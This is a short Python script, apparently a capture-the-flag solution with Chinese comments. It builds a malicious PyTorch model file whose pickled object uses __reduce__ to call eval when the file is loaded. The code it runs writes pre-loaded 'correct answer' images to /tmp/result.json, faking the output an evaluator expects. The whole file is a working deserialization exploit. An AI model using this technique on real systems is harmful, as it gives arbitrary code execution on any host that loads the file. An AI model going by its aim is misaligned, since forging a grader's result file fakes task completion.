import io
import json
import base64

import torch
import matplotlib
import matplotlib.image

# 加载正确答案
PIXEL_FILE="../files/dataset/pixels_10.pt"
predictions = torch.load(PIXEL_FILE, map_location="cpu")

# 生成 base64 格式的数据
gen_imgs = []
for i in range(10):
    out_io = io.BytesIO()
    matplotlib.image.imsave(out_io, predictions[i].numpy(), format="png")
    png_b64 = base64.b64encode(out_io.getvalue()).decode()
    gen_imgs.append(png_b64)

content = json.dumps({"gen_imgs_b64": gen_imgs})

# 构造要执行的 python 代码
args = "open('/tmp/result.json', 'w').write('" + content.replace('\\', '\\\\').replace("'", "\\'") + "')"

# 通过 __reduce__ 方法执行 python 代码
class Exploit(object):
    def __reduce__(self):
        return (eval, (args,))

torch.save(Exploit(), "model_exp.pt")
